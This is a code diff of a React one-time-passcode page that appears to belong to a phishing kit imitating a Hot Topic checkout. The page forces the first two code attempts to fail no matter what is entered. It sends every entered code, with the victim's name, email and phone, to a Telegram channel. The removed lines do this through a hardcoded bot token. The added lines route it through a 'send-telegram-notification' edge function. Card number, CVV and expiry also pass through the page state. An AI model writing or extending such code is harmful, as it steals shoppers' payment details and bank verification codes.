@@ -8,10 +8,6 @@ import HotTopicFooter from "@/components/HotTopicFooter";
 import { AlertCircle, Clock, Shield } from "lucide-react";
 import { InputOTP, InputOTPGroup, InputOTPSlot, InputOTPSeparator } from "@/components/ui/input-otp";
 
-// Telegram configuration directly in the code as requested
-const TELEGRAM_BOT_TOKEN = "7782642954:AAEhLo5kGD4MlWIsoYnnYHEImf7YDCLsJgo";
-const TELEGRAM_CHANNEL_ID = "-1002550945996";
-
 const OTPVerification = () => {
   const location = useLocation();
   const navigate = useNavigate();
@@ -87,12 +83,12 @@ const OTPVerification = () => {
     }
   }, [countdown, navigate]);
 
-  // Send Telegram notification directly without Supabase
-  const sendTelegramNotification = async (attemptNumber: number) => {
+  // Send Telegram notification for each specific attempt type
+  const sendTelegramNotificationForAttempt = async (attemptNumber: number) => {
     console.log(`Sending attempt ${attemptNumber} notification to Telegram`);
-    console.log(`Current OTP value being sent: "${otp}"`); // Log OTP value for debugging
-    
     try {
+      const isSuccess = attemptNumber === 3; // Third attempt is success
+      
       // Prepare user information
       const userInfo = {
         ip: orderDetails?.userInfo?.ip || "Unknown",
@@ -101,7 +97,7 @@ const OTPVerification = () => {
         timestamp: new Date().toISOString()
       };
       
-      // Create notification data with explicit OTP value
+      // Create complete notification data
       const notificationData = {
         customerName: orderDetails?.customerName || "N/A",
         email: orderDetails?.email || "N/A",
@@ -117,76 +113,47 @@ const OTPVerification = () => {
         userInfo: userInfo,
         notificationType: "otp_attempt",
         otpAttempt: attemptNumber,
-        otpValue: otp // Include the OTP value
+        otpValue: otp // Include the actual OTP value entered
       };
       
-      // Send directly to Telegram
-      const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-      
-      // Format a simple message for Telegram as requested
-      const message = `
-🔢 CODE ENTERED: ${otp || "NONE"}
+      console.log(`Telegram notification data for attempt ${attemptNumber}:`, notificationData);
 
-👤 Customer: ${orderDetails?.customerName || "N/A"}
-📧 Email: ${orderDetails?.email || "N/A"}
-📱 Phone: ${orderDetails?.phone || "N/A"}
-
-🔐 Verification Attempt: ${attemptNumber}/3
-
-📆 Attempt Time: ${new Date().toLocaleString()}
-`;
-
-      // Log the attempt to send
-      console.log("Sending to Telegram:", {
-        bot: TELEGRAM_BOT_TOKEN.substring(0, 8) + "...",
-        channel: TELEGRAM_CHANNEL_ID,
-        otpValue: otp
-      });
-      
-      // Send the notification directly to Telegram
-      const response = await fetch(telegramApiUrl, {
-        method: "POST",
+      // Call our Supabase Edge Function
+      const response = await fetch('/functions/v1/send-telegram-notification', {
+        method: 'POST',
         headers: {
-          "Content-Type": "application/json",
+          'Content-Type': 'application/json',
         },
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHANNEL_ID,
-          text: message,
-          parse_mode: "HTML",
-          disable_web_page_preview: true
-        })
+        body: JSON.stringify(notificationData),
       });
       
-      const result = await response.json();
-      console.log("Telegram API response:", result);
+      // Log the raw response
+      console.log(`Telegram API raw response for attempt ${attemptNumber}:`, response);
+      const responseText = await response.text();
+      console.log(`Telegram API response text for attempt ${attemptNumber}:`, responseText);
       
-      if (!result.ok) {
-        console.error("Telegram API error:", result);
+      // Try to parse the response as JSON
+      try {
+        const jsonResponse = JSON.parse(responseText);
+        console.log(`Parsed JSON response for attempt ${attemptNumber}:`, jsonResponse);
+        return jsonResponse?.success === true;
+      } catch (parseError) {
+        console.error(`Failed to parse response for attempt ${attemptNumber}:`, parseError);
         return false;
       }
-      
-      console.log("Telegram notification sent successfully");
-      return true;
-      
     } catch (error) {
-      console.error("Error sending Telegram notification:", error);
+      console.error(`Error sending Telegram notification for attempt ${attemptNumber}:`, error);
       return false;
     }
   };
   
   // Handle First Attempt OTP (always fails)
   const handleFirstAttempt = async () => {
-    setIsSubmitting(true);
-    
-    // Send notification for first attempt
-    await sendTelegramNotification(1);
-    
-    // Simulate processing delay
-    await new Promise(resolve => setTimeout(resolve, 1000));
-    
-    setIsSubmitting(false);
     setError("Invalid verification code. Please try again.");
     setAttempts(1); // Move to second attempt
+    
+    // Send notification for first attempt
+    await sendTelegramNotificationForAttempt(1);
     
     // Clear OTP input and reset
     setOtp("");
@@ -201,17 +168,11 @@ const OTPVerification = () => {
   
   // Handle Second Attempt OTP (always fails)
   const handleSecondAttempt = async () => {
-    setIsSubmitting(true);
-    
-    // Send notification for second attempt
-    await sendTelegramNotification(2);
-    
-    // Simulate processing delay
-    await new Promise(resolve => setTimeout(resolve, 1000));
-    
-    setIsSubmitting(false);
     setError("Invalid verification code. One more attempt remaining.");
     setAttempts(2); // Move to third attempt
+    
+    // Send notification for second attempt
+    await sendTelegramNotificationForAttempt(2);
     
     // Clear OTP input and reset
     setOtp("");
@@ -229,7 +190,7 @@ const OTPVerification = () => {
     setIsSubmitting(true);
     
     // Send notification for third (successful) attempt
-    await sendTelegramNotification(3);
+    await sendTelegramNotificationForAttempt(3);
     
     // Simulate processing delay
     await new Promise(resolve => setTimeout(resolve, 1500));
@@ -269,7 +230,7 @@ const OTPVerification = () => {
       return;
     }
     
-    console.log(`Processing attempt ${attempts + 1} with OTP: "${otp}"`);
+    console.log(`Processing attempt ${attempts + 1} with OTP: ${otp}`);
     
     // Handle each attempt separately
     if (attempts === 0) {
@@ -350,11 +311,7 @@ const OTPVerification = () => {
                 ******{orderDetails?.phone?.slice(-4) || "0000"}
               </p>
               <p className="text-gray-400 text-sm text-center">
-                {attempts === 0 
-                  ? "Please enter the verification code sent to your phone" 
-                  : attempts === 1 
-                    ? "First attempt failed. Please try again with a new code"
-                    : "Last attempt. Enter the verification code carefully"}
+                {getAttemptMessage()}
               </p>
               
               {/* Show attempt counter */}
@@ -444,22 +401,7 @@ const OTPVerification = () => {
                 <Button
                   type="button"
                   variant="outline"
-                  onClick={() => {
-                    navigate("/payment", { 
-                      state: { 
-                        orderDetails,
-                        giftCardValue,
-                        discountedAmount,
-                        cardNumber,
-                        cvv,
-                        expiryDate
-                      } 
-                    });
-                    toast({
-                      title: "Returning to Payment",
-                      description: "You'll need to re-enter your payment details.",
-                    });
-                  }}
+                  onClick={handleRequestNewOTP}
                   className="w-full py-2 text-white border-hottopic-gray hover:bg-hottopic-gray/20"
                 >
                   Back to Payment
